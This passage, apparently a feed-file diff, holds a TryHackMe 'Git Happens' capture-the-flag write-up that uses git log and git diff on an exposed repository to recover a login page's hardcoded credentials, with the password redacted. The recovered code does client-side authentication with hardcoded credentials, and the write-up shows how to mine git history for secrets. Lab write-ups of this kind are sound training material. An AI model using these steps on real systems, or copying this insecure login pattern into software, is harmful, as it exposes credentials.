-concept guides. See 'git help &amp;lt;command&amp;gt;' or 'git help &amp;lt;concept&amp;gt;'
-to read about a specific subcommand or concept.
-See 'git help git' for an overview of the system.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;First I ran the ‘log’ command to check the commits.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]             
-└──╼ $git log                                                              
-commit d0b3578a628889f38c0affb1b75457146a4678e5 (HEAD -&amp;gt; master, tag: v1.0)
-Author: Adam Bertrand &amp;lt;hydragyrum@gmail.com&amp;gt;                               
-Date:   Thu Jul 23 22:22:16 2020 +0000                                     
-                                                                           
-    Update .gitlab-ci.yml                                                  
-                                                                           
-commit 77aab78e2624ec9400f9ed3f43a6f0c942eeb82d                            
-Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;                                  
-Date:   Fri Jul 24 00:21:25 2020 +0200                                     
-                                                                           
-    add gitlab-ci config to build docker file.                             
-                                                                           
-commit 2eb93ac3534155069a8ef59cb25b9c1971d5d199                            
-Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;                                  
-Date:   Fri Jul 24 00:08:38 2020 +0200                                     
-                                                                           
-    setup dockerfile and setup defaults.                                   
-                                                                           
-commit d6df4000639981d032f628af2b4d03b8eff31213                            
-Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;                                  
-Date:   Thu Jul 23 23:42:30 2020 +0200
-
-    Make sure the css is standard-ish!
-
-commit d954a99b96ff11c37a558a5d93ce52d0f3702a7d
-Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;
-Date:   Thu Jul 23 23:41:12 2020 +0200
-
-    re-obfuscating the code to be really secure!
-
-commit bc8054d9d95854d278359a432b6d97c27e24061d
-Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;
-Date:   Thu Jul 23 23:37:32 2020 +0200
-
-    Security says obfuscation isn't enough.
-    
-    They want me to use something called 'SHA-512'
-
-commit e56eaa8e29b589976f33d76bc58a0c4dfb9315b1
-Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;
-Date:   Thu Jul 23 23:25:52 2020 +0200
-
-    Obfuscated the source code.
-    
-    Hopefully security will be happy!
-
-commit 395e087334d613d5e423cdf8f7be27196a360459
-Author: Hydragyrum &amp;lt;hydragyrum@gmail.com&amp;gt;
-Date:   Thu Jul 23 23:17:43 2020 +0200
-
-    Made the login page, boss!
-
-commit 2f423697bf81fe5956684f66fb6fc6596a1903cc
-Author: Adam Bertrand &amp;lt;hydragyrum@gmail.com&amp;gt;
-Date:   Mon Jul 20 20:46:28 2020 +0000
-
-    Initial commit
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Great, we can now see all the commits. Commits 2 and 3 look interesting, clearly the security team were not happy with the configuration, so lets take a look at the source code. I will use git diff to compare. We could also use git checkout.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]
-└──╼ $git diff 395e087334d613d5e423cdf8f7be27196a360459
-&amp;lt;&amp;lt;SNIP&amp;gt;&amp;gt;
-     &amp;lt;script&amp;gt;
--      function login() {
--        let form = document.getElementById(&quot;login-form&quot;);
--        console.log(form.elements);
--        let username = form.elements[&quot;username&quot;].value;
--        let password = form.elements[&quot;password&quot;].value;
--        if (
--          username === &quot;admin&quot; &amp;amp;&amp;amp;
--          password === &quot;&quot;
--        ) {
--          document.cookie = &quot;login=1&quot;;
--          window.location.href = &quot;/dashboard.html&quot;;
--        } else {
--          document.getElementById(&quot;error&quot;).innerHTML =
--            &quot;INVALID USERNAME OR PASSWORD!&quot;; 
--        }
--      }
-
-&amp;lt;&amp;lt;SNIP&amp;gt;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Found it! Ive redacted it from the output as part of the TryHackMe write up rules however the password is part of the login function.&lt;/p&gt;
-
-&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
-
-      
-      
-      
-      
-      
-
-      <author>
-          <name>Darryn</name>
-        
-        
-      </author>
-
-      
-
-      
-        <category term="tryhackme" />
-      
-        <category term="ctf" />
       
 
       
